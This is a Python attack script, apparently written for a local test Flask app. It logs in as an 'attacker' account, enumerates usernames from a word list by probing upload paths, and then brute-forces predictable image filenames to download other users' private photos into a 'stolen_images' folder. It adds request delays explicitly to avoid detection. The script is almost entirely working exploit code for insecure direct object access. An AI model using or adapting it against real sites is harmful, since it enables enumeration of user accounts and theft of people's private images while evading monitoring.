import requests
from bs4 import BeautifulSoup
import os
import time

# --------------------------------------
# Configuration
# --------------------------------------
base_url = "http://127.0.0.1:5000"  # Base URL of the Flask app
login_url = f"{base_url}/login"
home_url = f"{base_url}/"

root_dir = os.path.dirname(os.path.abspath(__file__))
username_file = os.path.join(root_dir, "names.txt")

output_folder = os.path.join(root_dir, "stolen_images")
os.makedirs(output_folder, exist_ok=True)

# Attacker's valid login credentials 
attacker_creds = {
    "identifier": "attacker",
    "password": "test123"
}

types = ['IMG', 'DSC', 'photo', 'image']
extensions = ['.jpg', '.jpeg', '.png']
test = 'IMG_0001'

found = 0
url = ""
count = 0

session = requests.Session()

session.post(login_url, data=attacker_creds)

with open(username_file, "r", encoding="utf-8", errors="ignore") as f:
    for line in f:
        user = line.strip()

        count = count + 1

        print(user, count)

        user_exists = False
        for ext in extensions:
            test_url = f"{base_url}/uploads/{user}/{test}{ext}"

            try:
                time.sleep(0.1)
                image = session.get(test_url)

                if image.status_code == 200:
                    print("Username found with", test_url)
                    user_exists = True
                    break  # No need to try other extensions
            except Exception as e:
                print(f"  [!] Error testing {test_url}: {e}")
            

        if user_exists: 

            for i in types:
                for ext in extensions:
                    
                    missed = 0

                    for j in range(1, 21):

                        if missed >= 5: # To avoid unneccessary requests
                            break

                        number = f"{j:04}"
                        filename = f'{i}_{number}{ext}'

                        url = f"{base_url}/uploads/{user}/{filename}"

                        try: # If username exists redo process for entire set

                            time.sleep(0.1)  # 100ms delay between requests to avoid being detected
                            image = session.get(url)

                            if image.status_code == 200:
                                
                                print(filename)

                                user_folder = os.path.join(output_folder, user)
                                os.makedirs(user_folder, exist_ok=True)

                                local_filename = os.path.join(user_folder, f"stolen_{filename}")

                                with open(local_filename, "wb") as f:
                                    f.write(image.content)

                            else:
                                missed += 1

                        except Exception as e:
                            print(f"  [!] Error: {e}")
                